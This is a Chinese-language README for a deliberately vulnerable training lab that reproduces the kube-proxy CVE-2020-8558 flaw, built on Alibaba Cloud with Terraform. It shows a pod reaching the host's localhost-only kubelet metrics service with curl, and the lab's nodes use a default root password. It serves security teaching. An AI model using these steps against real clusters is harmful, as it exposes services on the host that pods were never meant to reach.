# kube-proxy CVE-2020-8558漏洞环境

[English](./README.md) | 中文

## 描述信息

这是一个用于构建kubernetes kube-proxy组件CVE-2020-8558漏洞的靶场。

使用 terraform 构建环境后，用户在容器可以通过 kubelet组件CVE-2020-8558漏洞 访问到宿主机只绑定在127.0.0.1的服务。

## 环境搭建

在容器中执行以下命令

```shell
cd /TerraformGoat/kubernetes/kube-proxy/CVE-2020-8558
```

配置阿里云访问凭证

```shell
export ALICLOUD_ACCESS_KEY="LTAI5tFkmNGXXXXXXXXX"
export ALICLOUD_SECRET_KEY="ORBs2lulAHDXXXXXXXXX"
export ALICLOUD_REGION="cn-hongkong"
```

> 在阿里云控制台的 [AccessKey 页面](https://ram.console.aliyun.com/manage/ak) 可以创建和查看您的 AccessKey

部署靶场

```shell
terraform init
terraform apply
```

> 在终端提示 `Enter a value:` 时，输入 `yes` 即可

![img](../../../images/20220622-174141.jpg)

环境搭建完后，在 Outputs 处可以看到节点的访问地址。

## 漏洞利用

首先，我们先登陆到节点机器上，密码默认是 Huoxian@123

```shell
➜  ~ ssh root@8.210.237.96  // 8.210.237.96 是节点的访问地址，你需要替换成 Outputs 中的地址。
```

然后进入到已经创建好的pod shell环境

```shell
root@iZj6ce4bmwc11otulk7i3rZ:~# kubectl exec -ti test-pod -- sh      // test-pod 是pod名
sh-4.2#
```

下面就可以在pod中尝试访问宿主机上监听在 127.0.0.1 的服务了

```shell
root@iZj6ce4bmwc11otulk7i3rZ:~# netstat -antp|grep 127.0.0.1
tcp        0      0 127.0.0.1:37953         0.0.0.0:*               LISTEN      2551/containerd
tcp        0      0 127.0.0.1:41351         0.0.0.0:*               LISTEN      15900/kubelet
tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      15900/kubelet
...
```

比如，在pod可以访问到宿主机上的kubelet metrics服务

```shell
sh-4.2# curl 127.0.0.1:10249/metrics --interface eth0
# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.
# TYPE apiserver_audit_event_total counter
apiserver_audit_event_total 0
...
```

## 销毁环境

```shell
terraform destroy
```
